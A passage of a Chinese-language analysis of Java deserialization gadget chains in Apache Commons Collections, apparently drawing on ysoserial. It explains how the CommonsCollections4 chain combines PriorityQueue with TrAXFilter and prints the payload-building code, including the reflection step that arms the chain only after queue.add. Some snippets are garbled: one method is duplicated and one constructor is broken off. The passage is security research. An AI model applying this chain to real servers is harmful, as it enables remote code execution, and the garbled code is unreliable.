        } catch (InstantiationException ex) {
            throw new FunctorException("InstantiateTransformer: InstantiationException", ex);
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InstantiateTransformer: Constructor must be public", ex);
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InstantiateTransformer: Constructor threw an exception", ex);
        }
    }
如果transform方法的传入参数input可控，且iParamTypes（传入对象的构造方法）与iArgs（构造方法的传入参数）可控，即可调用任意类的构造方法。
    public InstantiateTransformer(Class[] paramTypes, Object[] args) {
        super();
        iParamTypes = paramTypes;
        iArgs = args;
    }
通过调用InstantiateTransformer构造方法可以实现对iParamTypes和iArgs参数的控制。目前的目标是调用TrAXFilter(恶意Templates对象)构造方法，通过构造上文提到的ChainedTransformer反射链，完成如下效果：
    TrAXFilter.getConstructor(Templates.class).newInstance(恶意Templates对象)
从而实现装载恶意Templates对象的TrAXFilter对象调用构造方法，实现恶意Templates对象的newTransformer调用。从而完成利用链的构造。
## **Commons-Collections 4**
CommonsCollections4的利用链构造是结合CommonsCollections2的source点（
**java.util.PriorityQueue** ）和CommonsCollections3的sink点（
**com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter** ）
**SINK：**
    Object templates = Gadgets.createTemplatesImpl(command);
    ConstantTransformer constant = new ConstantTransformer(String.class);
    // mock method name until armed
    Class[] paramTypes = new Class[] { String.class };
    Object[] args = new Object[] { "foo" };
    InstantiateTransformer instantiate = new InstantiateTransformer(
            paramTypes, args);
    // grab defensively copied arrays
    paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
    args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");
    ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });
    ···
    Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
    paramTypes[0] = Templates.class;
    args[0] = templates;
**source：**
    PriorityQueue queue = new PriorityQueue(2, new TransformingComparator(chain));
    queue.add(1);
    queue.add(1);
    return queue;
**这里存在一个问题**
：为什么不能像CommonsCollections3一样，在实例化ConstantTransformer对象时直接传入TrAXFilter对象，以及实例化InstantiateTransformer对象时，直接传入Templates.class和Templates对象？
由于PriorityQueue作为反序列化入口类，且装载恶意对象的queue属性设置了transient关键字，所以需要调用PriorityQueue#add方法为queue属性赋值，而在赋值的过程中，会调用comparator.compare(x,
(E) e)方法。
    public boolean add(E e) {
        return offer(e);
    }
调用offer方法
    public boolean offer(E e) {
        if (e == null)
            throw new NullPointerException();
        modCount++;
        int i = size;
        if (i >= queue.length)
            grow(i + 1);
        size = i + 1;
        if (i == 0)
            queue[0] = e;
        else
            siftUp(i, e);
        return true;
    }public boolean offer(E e) {    if (e == null)        throw new NullPointerException();    modCount++;    int i = size;    if (i >= queue.length)        grow(i + 1);    size = i + 1;    if (i == 0)        queue[0] = e;    else        siftUp(i, e);    return true;}
调用siftUpUsingComparator方法
    private void siftUp(int k, E x) {
        if (comparator != null)
            siftUpUsingComparator(k, x);
        else
            siftUpComparable(k, x);
    }
最终调用comparator.compare(x, (E) e)方法。
    private void siftUpUsingComparator(int k, E x) {
        while (k > 0) {
            int parent = (k - 1) >>> 1;
            Object e = queue[parent];
            if (comparator.compare(x, (E) e) >= 0)
                break;
            queue[k] = e;
            k = parent;
        }
        queue[k] = x;
    }
如果在调用add方法之前，调用ConstantTransformer(TrAXFilter.class)方法生成ConstantTransformer实例化对象，调用InstantiateTransformer(Templates.class,
恶意Templates对象)生成InstantiateTransformer实例化对象。在调用add方法是，会触发TransformingComparator#compare调用链，依次调用ConstantTransformer#transform方法，返回TrAXFilter对象。再调用InstantiateTransformer#transform方法，调用TrAXFilter.getConstructor((Templates.class).newInstance(templates)方法，从而在序列化之前触发了代码执行，并且抛出异常终止程序(正常流程是在服务器上反序列化，执行代码后抛出异常)。
因此为了避免程序在序列化之前中止，需要在调用add方法前，实例化不会抛出异常的正常ConstantTransformer实例化对象和InstantiateTransformer实例化对象。在执行add方法后，再通过反射将两个对象中的对应属性进行更改，完成序列化的正常运行。
CommonsCollections4的构造思路，结合CommonsCollections3的实现装载恶意Templates对象的TrAXFilter对象调用构造方法，实现恶意Templates对象的newTransformer调用的方式，生成一个恶意ChainedTransformer对象，再结合CommonsCollections2的source，通过调用PriorityQueue的构造方法，将恶意的ChainedTransformer对象赋值给PriorityQueue#comparator属性。
    ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });
    // create queue with numbers
    PriorityQueue queue = new PriorityQueue(2, new TransformingComparator(chain));
    public PriorityQueue(int initialCapacity, Comparator comparator) {
        // Note: This restriction of at least one is not actually needed,
        // but continues for 1.5 compatibility
        if (initialCapacity >> 16);
    }
在HashSet类的反序列化入口readObject方法中
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        // Read in any hidden serialization magic
        s.defaultReadObject();
        // Read capacity and verify non-negative.
        int capacity = s.readInt();
        if (capacity < 0) {
            throw new InvalidObjectException("Illegal capacity: " +
                                             capacity);
        }
        // Read load factor and verify positive and non NaN.
        float loadFactor = s.readFloat();
        if (loadFactor <= 0 || Float.isNaN(loadFactor)) {
            throw new InvalidObjectException("Illegal load factor: " +
                                             loadFactor);
        }
        // Read size and verify non-negative.